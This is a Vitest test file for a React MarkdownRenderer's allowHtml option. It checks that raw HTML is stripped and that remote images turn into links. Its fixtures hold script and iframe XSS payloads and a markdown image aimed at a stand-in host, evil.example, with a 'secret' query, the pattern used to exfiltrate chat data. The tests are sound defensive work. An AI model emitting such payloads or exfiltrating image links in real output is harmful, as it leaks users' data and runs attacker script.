import { createElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import { describe, expect, it } from "vitest";
import { MarkdownRenderer } from "./markdown-renderer";

const INJECTED = 'Answer **bold**\n\n<iframe srcdoc="<script>alert(1)</script>"></iframe>\n\n<script>alert(2)</script>';

const render = (allowHtml?: boolean) =>
  renderToStaticMarkup(createElement(MarkdownRenderer, { content: INJECTED, ...(allowHtml !== undefined ? { allowHtml } : {}) }));

describe("MarkdownRenderer allowHtml", () => {
  it("drops raw HTML when allowHtml is false", () => {
    const html = render(false);
    expect(html).toMatch(/<strong[^>]*>bold<\/strong>/);
    expect(html).not.toMatch(/<iframe/i);
    expect(html).not.toMatch(/<script/i);
  });

  it("keeps rendering raw HTML by default (existing chat page behaviour)", () => {
    expect(render()).toMatch(/<iframe/i);
  });
});

describe("MarkdownRenderer images", () => {
  const md = (content: string, allowHtml?: boolean) =>
    renderToStaticMarkup(createElement(MarkdownRenderer, { content, ...(allowHtml !== undefined ? { allowHtml } : {}) }));

  it("allowHtml=false: an http(s) image becomes a link (never an <img>), so it is not fetched", () => {
    const html = md("see ![chart](https://evil.example/x.png?q=secret)", false);
    expect(html).not.toMatch(/<img/i);
    expect(html).toMatch(/<a[^>]+href="https:\/\/evil\.example\/x\.png\?q=secret"[^>]*>🖼 chart<\/a>/);
    expect(html).toMatch(/rel="noopener noreferrer"/);
    expect(html).toMatch(/target="_blank"/);
  });

  it("allowHtml=false: a non-http image renders as plain text (no link, no <img>)", () => {
    const html = md("![logo](data:image/png;base64,AAAA) and ![rel](/local.png)", false);
    expect(html).not.toMatch(/<img/i);
    expect(html).not.toMatch(/<a /i);
    expect(html).toContain("🖼 logo");
    expect(html).toContain("🖼 rel");
  });

  it("allowHtml=false: an image without alt text links with its URL as the label", () => {
    expect(md("![](https://a.example/i.png)", false)).toMatch(/>🖼 https:\/\/a\.example\/i\.png<\/a>/);
  });

  it("default (allowHtml=true) keeps rendering images", () => {
    expect(md("![chart](https://example.com/x.png)")).toMatch(/<img[^>]+src="https:\/\/example\.com\/x\.png"/);
  });
});
